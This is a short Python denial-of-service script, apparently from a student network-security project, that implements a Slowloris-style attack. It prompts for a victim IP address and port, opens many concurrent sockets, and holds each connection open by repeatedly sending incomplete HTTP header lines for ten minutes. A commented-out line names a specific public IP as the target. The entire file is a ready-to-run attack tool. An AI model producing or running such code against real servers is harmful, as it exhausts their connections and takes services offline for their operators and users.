import socket
import random 
import time

class DOS():
    def __init__(self, ip, port, numberOfSocket):
        print("Creating sockets")
        self.ip = ip
        self.port = port
        self.headers = [
            "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
            "Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,cy;q=0.6"
        ]
        self.sockets=[]
        for each in range(numberOfSocket):
            self.sockets.append(self.new_socket())

    def new_socket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self.ip, self.port))
            s.send(self.http_get_message("Get /?"))
            for header in self.headers:
                s.send(bytes(bytes("{}\r\n".format(header).encode("utf-8"))))
            print("Socket created", s.getsockname())
            return s
        except socket.error as se:
            print("Error creating socket: ", str(se))
            time.sleep(0.5)
            return self.new_socket()
       
    def http_get_message(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")

    def dos_attack(self, timeout, sleep=15):
        t = time.time()
        i= 0
        while(time.time() - t < timeout):
            for s in self.sockets:
                try:
                    print("Sending request #{} from {} ".format(str(i), s.getsockname()))
                    s.send(self.http_get_message("X-a: "))
                    i += 1
                except socket.error:
                    self.sockets.remove(s)
                    self.sockets.append(self.new_socket())

print("Welcome to NDS Project - DOS Atta")                    
target=input("Enter victim ip address : ") 
port=int(input("Enter victim port : "))
numberOfSocket=int(input("Enter number of concurrent sockets: "))
# target= "44.202.118.21"
# port= 80
# numberOfSocket=1024
dos = DOS(target, port, numberOfSocket)
dos.dos_attack(timeout=60*10)

